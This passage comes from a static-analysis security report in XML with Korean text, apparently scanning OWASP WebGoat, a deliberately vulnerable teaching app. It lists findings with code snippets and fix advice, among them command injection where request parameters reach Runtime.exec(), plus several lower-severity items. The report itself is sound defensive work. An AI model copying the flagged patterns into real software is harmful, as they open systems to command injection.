                            <Abstract>Exec.java의 execOptions() 메서드는 신뢰할 수 없는 데이터에서 만들어진 명령을 사용하여 exec()을(를) 호출합니다. 이 호출로 인해 프로그램이 공격자 대신 악의적인 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>103</LineStart>
<Snippet>	{
	    // start the command
	    child = Runtime.getRuntime().exec(command);

	    // get the streams in and out of the command</Snippet>
<TargetFunction>java.lang.Runtime.exec()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="2390CF7C0D738E2BE2F968716E8C1539" ruleID="1C7A212C-7723-452B-97D5-4D94EC85829E">
                            <Category>Command Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>WSDLScanning.java의 accessWGService() 메서드는 신뢰할 수 없는 데이터에서 만들어진 명령을 사용하여 setOperationName()을(를) 호출합니다. 이 호출로 인해 프로그램이 공격자 대신 악의적인 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>WSDLScanning.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WSDLScanning.java</FilePath>
<LineStart>143</LineStart>
<Snippet>	    Service service = new Service();
	    Call call = (Call) service.createCall();
	    call.setOperationName(operationName);
	    call.addParameter(parameterName, serviceName, ParameterMode.INOUT);
	    call.setReturnType(XMLType.XSD_STRING);</Snippet>
<TargetFunction>org.apache.axis.client.Call.setOperationName()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>593</LineStart>
<Snippet>	}

	return request.getParameterValues(name);
    }
</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                        <Issue iid="1EE43C8EBD079E2A1595DC2E202F0C9A" ruleID="5760613C-9AF8-41EF-8431-66B6FBD4717A">
                            <Category>Command Injection</Category>
                            <Folder>Critical</Folder>
                            <Kingdom>Input Validation and Representation</Kingdom>
                            <Abstract>Exec.java의 execOptions() 메서드는 신뢰할 수 없는 데이터에서 만들어진 명령을 사용하여 exec()을(를) 호출합니다. 이 호출로 인해 프로그램이 공격자 대신 악의적인 명령을 실행할 수 있습니다.</Abstract>
                            <Friority>Critical</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>292</LineStart>
<Snippet>	{
	    // start the command
	    child = Runtime.getRuntime().exec(command);

	    // get the streams in and out of the command</Snippet>
<TargetFunction>java.lang.Runtime.exec()</TargetFunction>
                            </Primary>
                            <Source>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>627</LineStart>
<Snippet>	    throws ParameterNotFoundException
    {
	String[] values = request.getParameterValues(name);

	if (values == null)</Snippet>
<TargetFunction>javax.servlet.ServletRequest.getParameterValues()</TargetFunction>
                            </Source>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Dead Code: Expression is Always false</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Exec.java의 111 줄에 포함된 식은 항상 false가 됩니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>이 식은 항상 false가 됩니다. 프로그램을 보다 간단한 형태로 다시 작성할 수 있습니다. 주변의 코드는 디버깅 목적으로 존재하거나 프로그램 나머지 부분과 함께 유지 관리되지 않을 수도 있습니다. 또한 이 식은 메서드 앞부분에서 버그를 암시하기도 합니다.

예제 1: 다음 메서드는 secondCall을 false로 초기화한 후 설정하지 않습니다. (변수 firstCall은 실수로 두 번 사용되었습니다.)  그 결과, 식 firstCall &amp;&amp; secondCall은 항상 false가 되기 때문에 setUpDualCall()이 호출되지 않습니다.


public void setUpCalls() {
  boolean firstCall = false;
  boolean secondCall = false;

  if (fCall &gt; 0) {
    setUpFCall();
    firstCall = true;
  }
  if (sCall &gt; 0) {
    setUpSCall();
    firstCall = true;
  }

  if (firstCall &amp;&amp; secondCall) {
    setUpDualCall();
  }
}


예제 2: 다음 메서드는 firstCall 변수를 true로 설정하지 않습니다. (첫 번째 조건문 뒤에 firstCall 변수가 실수로 false로 설정되어 있습니다.)  결과는 firstCall &amp;&amp; secondCall 식의 첫 부분이 항상 false가 되는 것입니다.


public void setUpCalls() {
  boolean firstCall = false;
  boolean secondCall = false;

  if (fCall &gt; 0) {
    setUpFCall();
    firstCall = false;
  }
  if (sCall &gt; 0) {
    setUpSCall();
    secondCall = true;
  }

  if (firstCall &amp;&amp; secondCall) {
    setUpForCall();
  }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>일반적으로 사용하지 않는 코드는 수정하거나 삭제하는 것이 좋습니다. 프로그램의 기능에는 도움이 되지 않고 복잡하고 유지 관리 부담만 늘어납니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="7B1E951C4D673C4D0FBD72A921D46345" ruleID="0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8">
                            <Category>Dead Code: Expression is Always false</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Exec.java의 202 줄에 포함된 식은 항상 false가 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>202</LineStart>
<Snippet>		    output.write(c);

		    if (lazy &amp;&amp; (processError.available() &lt; 1))
		    {
			lazyQuit = true;</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E436EAD2DEBF7552C75CE00B65F90F49" ruleID="0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8">
                            <Category>Dead Code: Expression is Always false</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Exec.java의 111 줄에 포함된 식은 항상 false가 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>111</LineStart>
<Snippet>
	    // start the clock running
	    if (timeout &gt; 0)
	    {
		watcher = new ThreadWatcher(child, interrupted, timeout);</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="7B1E951C4D673C4D0FBD72A921D46344" ruleID="0E2798F4-EFFE-4390-A6F5-FFBD9DC071B8">
                            <Category>Dead Code: Expression is Always false</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>Exec.java의 156 줄에 포함된 식은 항상 false가 됩니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Exec.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/util/Exec.java</FilePath>
<LineStart>156</LineStart>
<Snippet>		    output.write(c);

		    if (lazy &amp;&amp; (processIn.available() &lt; 1))
		    {
			lazyQuit = true;</Snippet>
<TargetFunction>IfStatement()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Bad Practices: Non-Serializable Object Stored in Session</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>HammerHead.java의 doPost() 메서드는 non-serializable 개체를 HttpSession 속성으로 저장합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>J2EE 응용 프로그램은 여러 JVM을 이용하여 응용 프로그램 안정성과 성능을 개선합니다. 최종 사용자에게 여러 JVM을 하나의 응용 프로그램으로 보이게 하기 위해, J2EE 컨테이너는 여러 JVM에 HttpSession 개체를 복제하여 한 JVM을 사용할 수 없게 되면 다른 JVM이 개입하여 역할을 대신하기 때문에 응용 프로그램의 흐름이 중단되지 않습니다.

세션 복제가 제대로 동작하려면 응용 프로그램이 세션에 속성으로 저장한 값이 Serializable 인터페이스를 구현해야 합니다. 

예제 1: 다음 클래스는 자신을 세션에 추가하지만 serializable 상태가 아니므로 세션을 더 이상 복제할 수 없습니다.


public class DataGlob {
   String globName;
   String globValue;

   public void addToSession(HttpSession session) {
     session.setAttribute("glob", this);
   }
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>대부분의 경우, 이 문제를 해결하는 가장 간단한 방법은 잘못된 개체가 Serializable 인터페이스를 구현하게 하는 것입니다. 

예제 2: Example 1의 코드는 다음과 같이 다시 작성할 수 있습니다.


public class DataGlob implements java.io.Serializable {
   String globName;
   String globValue;

   public void addToSession(HttpSession session) {
     session.setAttribute("glob", this);
   }
}


복잡한 개체의 경우, 세션에 저장된 개체의 이행 폐쇄가 serializable 상태이어야 합니다. 개체 A가 개체 B를 참조하고 개체 A가 세션에 저장되어 있는 경우, A와 B 모두 Serializable을 구현해야 합니다.

Serializable 인터페이스를 구현하는 것은 쉽지만(인터페이스가 클래스가 임의의 메서드를 정의하도록 하지 않기 때문에) 일부 유형의 개체는 문제를 일으킵니다. 외부 리소스에 대한 참조를 갖고 있는 개체를 조심하십시오. 예를 들어, 스트림과 JNI 모두 문제를 일으킬 가능성이 큽니다.

예제 3: 형식 검사를 사용하여 serializable 개체를 요구하십시오. 다음 코드는 사용하지 마십시오:


public static void addToSession(HttpServletRequest req,
                     String attrib, Object obj)
{
  HttpSession sess = req.getSession(true);
  sess.setAttribute(attrib, obj);
}


대신 다음과 같이 작성하십시오.


public static void addToSession(HttpServletRequest req,
                     String attrib, Serializable ser) {
  HttpSession sess = req.getSession(true);
  sess.setAttribute(attrib, ser);
}
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="B96B5A4FBCEB70097F4ECF81D73AFED7" ruleID="7F7E0FDE-A69E-4F6F-91DB-F75A45091CC1">
                            <Category>J2EE Bad Practices: Non-Serializable Object Stored in Session</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 non-serializable 개체를 HttpSession 속성으로 저장합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>185</LineStart>
<Snippet>	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());

	    request.getRequestDispatcher(getViewPage(mySession)).forward(</Snippet>
<TargetFunction>FunctionCall: setAttribute()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BBE9280C3BECCBC8383753AA8671ED1F" ruleID="7F7E0FDE-A69E-4F6F-91DB-F75A45091CC1">
                            <Category>J2EE Bad Practices: Non-Serializable Object Stored in Session</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>HammerHead.java의 updateSession() 메서드는 non-serializable 개체를 HttpSession 속성으로 저장합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>495</LineStart>
<Snippet>	    // System.out.println( "HH Creating new WebSession: " );
	    session = new WebSession(this, context);
	    hs.setAttribute(WebSession.SESSION, session);
	    // reset timeout
	    hs.setMaxInactiveInterval(sessionTimeoutSeconds);</Snippet>
<TargetFunction>FunctionCall: setAttribute()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A12C670B3900D9AED1EDA6400222545E" ruleID="7F7E0FDE-A69E-4F6F-91DB-F75A45091CC1">
                            <Category>J2EE Bad Practices: Non-Serializable Object Stored in Session</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Time and State</Kingdom>
                            <Abstract>HammerHead.java의 doPost() 메서드는 non-serializable 개체를 HttpSession 속성으로 저장합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HammerHead.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/HammerHead.java</FilePath>
<LineStart>184</LineStart>
<Snippet>	    }
	    request.setAttribute("client.browser", clientBrowser);
	    request.getSession().setAttribute("websession", mySession);
	    request.getSession().setAttribute("course", mySession.getCourse());
</Snippet>
<TargetFunction>FunctionCall: setAttribute()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>J2EE Misconfiguration: Missing Error Handling</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>웹 응용 프로그램은 기본 오류 페이지를 정의하여 공격자가 응용 프로그램 컨테이너의 기본 제공 오류 응답의 정보를 빼내는 것을 방지해야 합니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>공격자가 웹 사이트에서 취약점을 찾기 위해 탐색할 때 사이트가 제공하는 정보의 양이 공격 시도의 성패를 결정짓는 핵심 요소입니다. 응용 프로그램이 공격자에게 스택 추적을 보여주면 공격자의 공격을 아주 쉽게 만드는 정보를 제공하는 셈이 됩니다. 예를 들어, 스택 추적은 공격자에게 잘못된 SQL 쿼리 문자열, 사용 중인 데이터베이스 유형 및 응용 프로그램 컨테이너 버전을 보여줄 수 있습니다. 공격자는 이 정보를 사용하여 이 구성 요소의 알려진 취약점을 공략합니다.

응용 프로그램 구성은 응용 프로그램이 오류 메시지를 공격자에게 누출하지 않는다는 것을 보장하기 위해 기본 오류 페이지를 지정해야 합니다. 표준 HTTP 오류 코드를 처리하는 것은 바람직한 보안 관행일 뿐만 아니라 유용하고 사용자 친화적입니다. 또한 응용 프로그램에서 발생할 수 있는 예외를 포착하는 마지막 오류 처리기도 정의해야 좋은 구성이라고 할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>웹 응용 프로그램은 기본 오류 페이지와 함께 구성해야 합니다. web.xml에 최소한 다음 항목이 포함되어야 합니다.


&lt;error-page&gt;
   &lt;exception-type&gt;java.lang.Throwable&lt;/exception-type&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
&lt;error-page&gt;
   &lt;error-code&gt;404&lt;/error-code&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
&lt;error-page&gt;
   &lt;error-code&gt;500&lt;/error-code&gt;
&lt;location&gt;/error.jsp&lt;/location&gt;
&lt;/error-page&gt;
</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="88F4D7D5D6180F7BCFE26DFEB49ADCA4" ruleID="749BCC9F-FE61-4DC0-9EF2-5EF1872C7717">
                            <Category>J2EE Misconfiguration: Missing Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>웹 응용 프로그램은 기본 오류 페이지를 정의하여 공격자가 응용 프로그램 컨테이너의 기본 제공 오류 응답의 정보를 빼내는 것을 방지해야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web-unix.xml</FileName>
<FilePath>WebContent/WEB-INF/web-unix.xml</FilePath>
<LineStart>6</LineStart>
<Snippet>    "http://java.sun.com/dtd/web-app_2_3.dtd"&gt;

&lt;web-app&gt;

    &lt;!-- General description of your web application --&gt;</Snippet>
<TargetFunction>/web-app()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="399A248E35AE0FBB04255DE45FA9754C" ruleID="749BCC9F-FE61-4DC0-9EF2-5EF1872C7717">
                            <Category>J2EE Misconfiguration: Missing Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>웹 응용 프로그램은 기본 오류 페이지를 정의하여 공격자가 응용 프로그램 컨테이너의 기본 제공 오류 응답의 정보를 빼내는 것을 방지해야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web.xml</FileName>
<FilePath>WebContent/WEB-INF/web.xml</FilePath>
<LineStart>6</LineStart>
<Snippet>    "http://java.sun.com/dtd/web-app_2_3.dtd"&gt;

&lt;web-app&gt;

    &lt;!-- General description of your web application --&gt;</Snippet>
<TargetFunction>/web-app()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A4F1C9B64A6151C8466143432EBAA61B" ruleID="749BCC9F-FE61-4DC0-9EF2-5EF1872C7717">
                            <Category>J2EE Misconfiguration: Missing Error Handling</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Environment</Kingdom>
                            <Abstract>웹 응용 프로그램은 기본 오류 페이지를 정의하여 공격자가 응용 프로그램 컨테이너의 기본 제공 오류 응답의 정보를 빼내는 것을 방지해야 합니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>web-windows.xml</FileName>
<FilePath>WebContent/WEB-INF/web-windows.xml</FilePath>
<LineStart>6</LineStart>
<Snippet>    "http://java.sun.com/dtd/web-app_2_3.dtd"&gt;

&lt;web-app&gt;

    &lt;!-- General description of your web application --&gt;</Snippet>
<TargetFunction>/web-app()</TargetFunction>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Privacy Violation: Autocomplete</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>Login.jsp의 형식은 31 줄의 자동 완성을 사용하면 일부 브라우저의 기록에 민감한 정보를 보유할 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>자동 완성이 활성화된 경우, 일부 브라우저에 세션에 대한 사용자 입력이 유지되면 초기 사용자 이후에 컴퓨터를 사용하는 사람은 이전에 전송된 정보를 볼 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>폼 또는 민감한 입력에 대한 자동 완성을 명시적으로 비활성화하십시오. 자동 완성을 비활성화하면 입력 시 이전에 입력한 정보는 사용자에게 다시 나타나지 않습니다. 또한 대부분의 주요 브라우저의 "내 암호 저장" 기능이 비활성화됩니다.

예제 1: HTML 폼에서 form 태그의 autocomplete 속성 값을 off로 설정하여 모든 입력 필드의 자동 완성을 비활성화하십시오.


  &lt;form method="post" autocomplete="off"&gt;
        Address: &lt;input name="address" /&gt;
        Password: &lt;input name="password" type="password" /&gt;
  &lt;/form&gt;


예제 2: 또는 해당 태그의 autocomplete 속성 값을 off로 설정하여 특정 입력 필드의 자동 완성을 비활성화하십시오.


  &lt;form method="post"&gt;
        Address: &lt;input name="address" /&gt;
        Password: &lt;input name="password" type="password" autocomplete="off"/&gt;
  &lt;/form&gt;


autocomplete 속성의 기본값이 on인지 확인하십시오. 따라서 민감한 입력을 다룰 경우, 속성을 생략하지 마십시오.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="64CBDEF734698ED2CFE22E8F71A0537C" ruleID="2FC7D1FF-11E4-468E-B7AB-F127828F4016">
                            <Category>Privacy Violation: Autocomplete</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Login.jsp의 형식은 31 줄의 자동 완성을 사용하면 일부 브라우저의 기록에 민감한 정보를 보유할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/SQLInjection/Login.jsp</FilePath>
<LineStart>31</LineStart>
<Snippet>				&lt;br&gt;
			    	&lt;label&gt;Password
			    		&lt;input name="password" type="password" size="10" maxlength="8" /&gt;
			    &lt;/label&gt;
				&lt;br&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="64CBDEF734698ED2CFE22E8F71A0537A" ruleID="2FC7D1FF-11E4-468E-B7AB-F127828F4016">
                            <Category>Privacy Violation: Autocomplete</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Login.jsp의 형식은 31 줄의 자동 완성을 사용하면 일부 브라우저의 기록에 민감한 정보를 보유할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/CrossSiteScripting/Login.jsp</FilePath>
<LineStart>31</LineStart>
<Snippet>				&lt;br&gt;
			    	&lt;label&gt;Password
			    		&lt;input name="password" type="password" size="10" maxlength="8" /&gt;
			    &lt;/label&gt;
				&lt;br&gt;</Snippet>
                            </Primary>
                        </Issue>
                        <Issue iid="64CBDEF734698ED2CFE22E8F71A0537B" ruleID="2FC7D1FF-11E4-468E-B7AB-F127828F4016">
                            <Category>Privacy Violation: Autocomplete</Category>
                            <Folder>High</Folder>
                            <Kingdom>Security Features</Kingdom>
                            <Abstract>Login.jsp의 형식은 31 줄의 자동 완성을 사용하면 일부 브라우저의 기록에 민감한 정보를 보유할 수 있습니다.</Abstract>
                            <Friority>High</Friority>
                            <Primary>
<FileName>Login.jsp</FileName>
<FilePath>WebContent/lessons/RoleBasedAccessControl/Login.jsp</FilePath>
<LineStart>31</LineStart>
<Snippet>				&lt;br&gt;
			    	&lt;label&gt;Password
			    		&lt;input name="password" type="password" size="10" maxlength="8" /&gt;
			    &lt;/label&gt;
				&lt;br&gt;</Snippet>
                            </Primary>
                        </Issue>
                    </GroupingSection>
                    <GroupingSection count="3">
                        <groupTitle>Redundant Null Check</groupTitle>
                        <MajorAttributeSummary>
                            <MetaInfo>
<Name>Abstract</Name>
<Value>FailOpenAuthentication.java의 createContent() 메서드는 86 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Explanation</Name>
<Value>Null 포인터 예외는 일반적으로 하나 이상의 프로그래머 가정을 위반했을 때 발생합니다. 역참조 후 검사(check-after-dereference) 오류는 프로그램에서 개체가 null인지 검사하기 전에 null이 될 수 있는 개체를 역참조할 경우 발생합니다.

대부분의 null 포인터 이슈는 소프트웨어 전반의 안정성 문제를 야기하지만 공격자가 의도적으로 null 포인터 역참조를 실행하는 경우, 그 결과 발생하는 예외 사항을 사용하여 보안 로직을 무시하거나 차후의 공격을 계획하는 데 유용한 디버깅 정보를 응용 프로그램이 노출하도록 할 수 있습니다.

예제: 다음 코드에서 프로그래머는 변수 foo가 null이 아닌 것으로 가정한 다음 개체를 역참조하여 이 가정을 확인합니다. 그러나 프로그래머는 나중에 foo를 null에 대해 검사함으로써 가정을 반박합니다. if문에서 검사할 때 foo가 null이 되면 역참조될 때도 null이 되어 null 포인터 예외가 발생할 수 있습니다. 역참조가 안전하지 않거나 이후의 검사가 필요하지 않게 됩니다.


foo.setBar(val);
...
if (foo != null) {
	...
}
</Value>
                            </MetaInfo>
                            <MetaInfo>
<Name>Recommendations</Name>
<Value>null일 수도 있는 개체를 역참조하기 전에 주의를 기울여 검사합니다. 가능한 경우, 추상 null은 리소스를 조작하는 코드 주변의 래퍼를 검사하여 모든 경우에 적용되는지 확인하고 실수가 발생할 위치를 최소화합니다.</Value>
                            </MetaInfo>
                            <AttributeValue>
<Name>&lt;Unaudited&gt;</Name>
<Count>3</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not an Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Reliability Issue</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Bad Practice</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Suspicious</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Exploitable</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>Not predicted</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(not an issue threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                            <AttributeValue>
<Name>indeterminate(below exploitable threshold)</Name>
<Count>0</Count>
                            </AttributeValue>
                        </MajorAttributeSummary>
                        <Issue iid="A26B43E0B8AAAD5F57F50A634528CE5A" ruleID="03840C20-F22B-B900-B76E-63258B717C77">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>PathBasedAccessControl.java의 createContent() 메서드는 110 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>PathBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/PathBasedAccessControl.java</FilePath>
<LineStart>110</LineStart>
<Snippet>		// allow them to look at any file in the webgoat hierachy.  Don't allow them
		// to look about the webgoat root, except to see the LICENSE file
		if (upDirCount(file) == 3 &amp;&amp; !file.endsWith("LICENSE"))
		{
		    s.setMessage("Access denied");</Snippet>
<TargetFunction>Dereferenced : file()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="987807EAE60CA92A96535EF3C959F28B" ruleID="771E5717-2B4D-64FC-9A63-E16701E24D0D">
                            <Category>Redundant Null Check</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Code Quality</Kingdom>
                            <Abstract>FailOpenAuthentication.java의 createContent() 메서드는 104 줄의 null 포인터를 역참조하여 프로그램이 중단될 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>FailOpenAuthentication.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/FailOpenAuthentication.java</FilePath>
<LineStart>104</LineStart>
<Snippet>		// username/password was entered when they first enter the lesson via the side menu.
		// This also suppresses the error if they just hit the login and both fields are empty.
		if (username.length() != 0)
		{
